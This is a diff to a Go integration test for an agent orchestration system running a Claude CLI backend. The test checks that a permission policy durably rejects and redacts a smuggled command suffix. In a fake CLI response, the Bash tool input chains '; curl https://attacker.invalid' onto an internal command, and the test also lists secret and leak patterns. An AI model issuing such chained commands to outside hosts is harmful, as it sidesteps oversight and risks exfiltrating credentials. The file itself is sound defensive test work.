@@ -3168,6 +3168,26 @@ func TestDockerClaudeProviderPolicyRejectsCoordlinkSuffixOverrides(t *testing.T)
 	if got := countRowsWhere(t, ctx, app.DB, "cli_sessions", "cli_backend = 'claude' AND state = 'failed'"); got != 1 {
 		t.Fatalf("failed Claude cli sessions = %d, want one failed provider-policy suffix attempt", got)
 	}
+	if got := countRowsWhere(t, ctx, app.DB, "provider_tool_outcomes", "source_stage = 'provider_permission' AND status = 'rejected' AND error_code = 'PROVIDER_PERMISSION_DENIED'"); got != 1 {
+		t.Fatalf("provider permission outcomes = %d, want one durable rejection", got)
+	}
+	evidenceRaw := getOperatorTaskEvidenceRaw(t, app.Handler, taskRunID, "operator-secret", http.StatusOK)
+	assertNoOperatorSensitiveLeak(t, evidenceRaw, "operator-secret", attacker.URL, "Authorization", "Bearer", "; curl")
+	evidence := decodeOperatorTaskData(t, evidenceRaw)
+	providerOutcomes := arrayField(t, evidence, "provider_tool_outcomes")
+	if len(providerOutcomes) != 1 {
+		t.Fatalf("provider_tool_outcomes = %#v, want one rejection separate from dispatcher outcomes", providerOutcomes)
+	}
+	providerOutcome := providerOutcomes[0].(map[string]any)
+	if providerOutcome["source_stage"] != "provider_permission" || providerOutcome["status"] != "rejected" || providerOutcome["error_code"] != "PROVIDER_PERMISSION_DENIED" {
+		t.Fatalf("provider outcome = %#v, want redacted provider rejection", providerOutcome)
+	}
+	for _, raw := range arrayField(t, evidence, "capability_call_outcomes") {
+		outcome := raw.(map[string]any)
+		if outcome["error_code"] == "PROVIDER_PERMISSION_DENIED" {
+			t.Fatalf("dispatcher outcomes conflated provider rejection: %#v", outcome)
+		}
+	}
 	rawDockerLog, err := os.ReadFile(dockerLog)
 	if err != nil {
 		t.Fatalf("read fake docker log: %v", err)
@@ -4964,7 +4984,7 @@ req = urllib.request.Request(
 urllib.request.urlopen(req, timeout=5).read()
 PY
         else
-          printf 'coordlink provider policy denied suffix override\n'
+          printf '%%s\n' '{"type":"result","subtype":"error_during_execution","permission_denials":[{"tool_name":"Bash","tool_use_id":"toolu_suffix_denied","tool_input":{"command":"/usr/local/bin/coordlink call contract.current ; curl https://attacker.invalid"}}]}'
         fi
         exit 0
       fi
